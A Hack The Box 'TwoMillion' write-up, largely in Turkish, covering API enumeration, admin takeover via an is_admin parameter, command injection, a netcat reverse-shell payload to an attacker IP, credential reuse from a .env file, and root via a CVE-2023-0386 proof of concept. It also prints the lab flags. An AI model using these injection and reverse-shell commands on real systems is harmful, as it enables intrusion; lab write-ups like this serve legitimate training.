
# Linux - TwoMillion

IP=`10.10.11.221`


---------------------------------------------------------------------------------------------------

# Enum

```bash
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx
|_http-title: Did not follow redirect to http://2million.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS

```

ports:`22,80`



---------------------------------------------------------------------------------------------------


# Web - 80
## domain: `2million.htb`

tuhaf bir invite alanı var. hacklemeni girmeni istiyor.
1. `view-source:http://2million.htb/invite` 'da `/js/inviteapi.min.js` adında bir js var.
2. bu js dosyası obfuscated halde. ai'a deobfuscate ettirdim. 
3. js dosyasının içinde `/api/v1/invite/how/to/generate` endopointi JSON olarak konmuş
4. endpointe curl ile post atınca. rot13 şifreli mesaj geliyor: `In order to generate the invite code, make a POST request to \/api\/v1\/invite\/generate`
5. invite code base64 ile encoded: `PMWTJ-89PNR-0R08A-OOTZ3`

## register
1. invite kodunu girdim. `http://2million.htb/invite` sonra register
username:f
mail:f@f.com
pass:f

## access
`/api/v1/user/vpn/generate` endpointinde vpn dosyası indirilebiliyor
ancak çalışmıyor.

## api pentesting
1. `/api/v1/user` şüpheli, curl `/api/v1/admin` yapınca 301 döndü
2. `/api/v1/admin/eric` gibi endpointler var mı? ffuf ile binlerce denemeye rağmen hepsi 301
3. api testing bilmediğim için https://github.com/assetnote/kiterunner isimli bir toolu denicem.

```bash
kr brute http://2million.htb/api/v1/admin -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints-res.txt -x 20 -d=0
GET     401 [      0,    0,   0] http://2million.htb/api/v1/admin/auth 
```
endpoint geldi.
## endpoint = `http://2million.htb/api/v1/admin/auth`

4. curl /api 401 dönüyor.
cookie'm ile get atınca mesaj döndü.
bu arada browserı kapatma çünkü cookie gidiyor.
```bash
curl -b "PHPSESSID=6ke4hshft0sj0k8lhnjamvqfa7" -v http://2million.htb/api
{"\/api\/v1":"Version 1 of the API"}
```
akla diğer versiyonları denemek geliyor.

5. ondan önce /api/v1/admin/auth endpointine bizim cookie ile curl attım.
message:false dedi. demekki admin auth olmadı :(

6. /api/v1 endpointine cookiem ile curl attım. büyük bir JSON
tüm api ağı burda
```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

7. `/api/v1/admin/settings/update` ile user accountu admin accountune çevirebiliyormuşuz.
```bash
curl -X PUT -b "PHPSESSID=6ke4hshft0sj0k8lhnjamvqfa7" -v http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Invalid content type."}
```
content type json yapıcaz:

```bash
curl -X PUT -d "param" -b "PHPSESSID=jmbsd7l486j14lvsf7kf4dfg84" -H "Content-Type:application/json" -v http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Missing parameter: email"}
```
email vericez:

```bash
curl -X PUT -d '{"email":"f@f.com"}' -b "PHPSESSID=jmbsd7l486j14lvsf7kf4dfg84" -H "Content-Type:application/json" -v http://2million.htb/api/v1/admin/settings/update
{"status":"danger","message":"Missing parameter: is_admin"}
```
is_admin vericez:

```bash
curl -X PUT -d '{"email":"f@f.com","is_admin":1}' -b "PHPSESSID=jmbsd7l486j14lvsf7kf4dfg84" -H "Content-Type:application/json" -v http://2million.htb/api/v1/admin/settings/update
{"id":13,"username":"f","is_admin":1}
```
burda JSON datası olarak admini `1` vermeye dikkat ettim. `"1"` olmamalı.


8. htb hintine baktım ve bi tanesinde command injection olduğunu söylüyor.
bissürü denedim: `/api/v1/admin/vpn/generate` olabilir.

şöyle bir blind deneyince python sunucuma istek geldi :)
```bash
curl -X POST -d '{"username":";curl http://10.10.16.234"}' -b "PHPSESSID=jmbsd7l486j14lvsf7kf4dfg84" -H "Content-Type:application/json" -v http://2million.htb/api/v1/admin/vpn/generate
```

9. revshell
```bash
curl -X POST -d '{"username":";rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.16.234 1401 >/tmp/f"}' -b "PHPSESSID=jmbsd7l486j14lvsf7kf4dfg84" -H "Content-Type:application/json" -v http://2million.htb/api/v1/admin/vpn/generate
```

10. pty ile shell


---------------------------------------------------------------------------------------------------

# Initial Access - www-data
```bash
www-data@2million:/home/admin$ cat user.txt
cat user.txt
cat: user.txt: Permission denied
```

---------------------------------------------------------------------------------------------------

# privesc - www-data 2 admin
```bash
www-data@2million:~/html$ cat .env
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

## CREDS: `admin:SuperDuperPass123`

ssh için de aynı password.

## user.txt: `d7f215baf3052922aecc0577035e202b`
---------------------------------------------------------------------------------------------------

# privesc - admin 2 root

1. linpeas

2. mysql userı bişey çalıştırıyor: `/usr/sbin/mariadbd`

3. 127.0.0.1:3306 (mssql) portu çalışıyor. port dışarı kapalı

4. linpeas %99 privesc vector diyo: You can write SUID file: `/tmp/ovlcap/upper/file`
ovlvap diye araştırınca: `CVE-2023-0386`

5. https://github.com/chenaotian/CVE-2023-0386 'dan wgetledim.
compile olmadı. chatgpt önerisiyle `#include <unistd.h>` ekledim.

6. birtürlü olmadı sonra poc'a baktım. ben yanlışlıkla dosyayı silmişim.
makineyi yeniden başlattırdım. ip sabit kalıyor ohh.

7. olmuyoooo!!! chris aluplui writeup izledim şunu kullanıyor:
`https://github.com/DataDog/security-labs-pocs/raw/refs/heads/main/proof-of-concept-exploits/overlayfs-cve-2023-0386/poc.c`

8. root.txt

## root.txt: `8b5769946fbd7a518ed54c8bf5739c88`

---------------------------------------------------------------------------------------------------

---------------------------------------------------------------------------------------------------



---------------------------------------------------------------------------------------------------
